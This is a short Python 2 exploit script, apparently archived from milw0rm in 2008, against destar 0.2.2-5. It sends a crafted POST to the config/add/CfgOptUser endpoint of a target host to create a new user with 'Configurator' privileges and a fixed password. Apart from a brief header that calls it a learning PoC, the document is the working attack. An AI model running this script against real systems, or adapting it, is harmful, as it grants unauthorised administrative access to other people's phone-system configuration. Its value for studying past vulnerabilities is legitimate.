#
#!/usr/bin/python
#
# Exploit for destar 0.2.2-5, tested on Linux Debian
#
# Bug found and  exploit coded by a non root user
#
# http://nonroot.blogspot.com
#
# Enero 2008
#
# This is a PoC, please use it just for learning how to exploit something
#
# use: $python ./exploit_code.py
#
# required: urllib,urllib2 sys and re
#
import urllib,urllib2
import sys,re
print "Target host: i.e: http://127.0.0.1:8080/"
host=raw_input("Target host ( include http and /): ")
#info for the new user
#
user='mama'
password='mama'
source_ip='127.0.0.9'
phone=''
level='Configurator'
language='en'
#
#
req = urllib2.Request(host)
adduser = urllib.urlencode({'name': user, 'secret': password, 'pc' : source_ip, 'submit' : "Submit", 'phone' : phone, 'level' : level, 'language' : language})
req.add_header('X_FORWARDED_FOR','')
req = urllib2.Request(host+"config/add/CfgOptUser")
r = urllib2.urlopen(req,adduser)
data=r.read()
lookup=re.compile("There were errors").search
match=lookup(data)
if not match:
	print "Ok, now go and test your user at:",host
else:
	print "Exploit failed, sorry, go and find some new bug or check this code and fix it!"
	sys.exit(2)

sys.exit(0)

# milw0rm.com [2008-03-23]